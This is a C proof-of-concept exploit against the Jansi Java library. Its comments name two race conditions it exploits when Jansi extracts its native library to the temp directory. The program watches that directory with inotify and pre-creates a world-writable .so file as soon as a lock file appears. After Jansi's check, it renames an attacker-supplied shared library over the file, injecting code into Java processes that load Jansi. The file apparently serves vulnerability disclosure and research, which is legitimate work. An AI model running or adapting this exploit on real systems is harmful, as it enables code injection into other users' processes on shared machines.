/* jansi code injection PoC by Fluff Satoshi 🐦 */
#include <errno.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "jansi-util.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (1024 * (EVENT_SIZE + 16))

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s <INJECTED_JANSI_LIBRARY_SO>\n", argv[0]);
    return 1;
  }
  char injected_so[PATH_MAX + 1];
  char *folder = getenv("TMPDIR");
  if (!folder)
    folder = "/tmp";
  realpath(argv[1], injected_so);

  chdir(folder);
  int out_fd;
  /* prepare copy of INJECTED_SO */
  char temp_name[] = "soXXXXXX";
  if ((out_fd = mkstemp(temp_name)) < 0) {
    perror("mkstemp");
    return 1;
  }
  fchmod(out_fd, 0777);
  if (cp(out_fd, injected_so) < 0) {
    fprintf(stderr, "cp from '%s' to '%s' failed: %s\n", injected_so, temp_name, strerror(errno));
    return 1;
  }

  int fd;
  fd = inotify_init();

  if (fd < 0) {
    perror("inotify_init");
    return 1;
  }
  int wd;
  umask(0000);
  wd = inotify_add_watch(fd, ".", IN_CREATE | IN_CLOSE_NOWRITE);

  /* need to create files world writable*/
  int length;
  int exit_status = 1;
  char buffer[BUF_LEN];
  while ((length = read(fd, buffer, BUF_LEN)) >= 0) {
    size_t i = 0;
    while (i < length) {
      struct inotify_event *event = (struct inotify_event *)&buffer[i];

      if (!event->len)
        continue;

      if ((event->mask & IN_CREATE) && (jansi_file_type(event->name) == JANSI_LCK)) {
        /* RACE Condition 1: Create corresponding SO file before Jansi creates it */
        char *so_name = strndup(event->name, strlen(event->name) - 4);
        if (open(so_name, O_WRONLY | O_CREAT | O_TRUNC, 0777) < 0) {
          perror("open");
          goto out;
        };
        /* fprintf(stderr, "created empty world-writable-so %s\n", so_name); */
        free(so_name);
      } else if ((event->mask & IN_CLOSE_NOWRITE) && (jansi_file_type(event->name) == JANSI_SO)) {
        /* RACE Condition 2: Jansi checked if the written file equals the source from the JAR  */
        if (rename(temp_name, event->name) < 0) {
          fprintf(stderr, "rename '%s' -> '%s' failed: %s\n", temp_name, event->name, strerror(errno));
        } else {
          fprintf(stderr, "Injected %s into %s\n", injected_so, event->name);
          exit_status = 0;
        }
        goto out;
      }
      i += EVENT_SIZE + event->len;
    }
  }
out:
  if (length < 0)
    perror("read");

  (void)inotify_rm_watch(fd, wd);
  (void)close(fd);

  return exit_status;
  ;
}
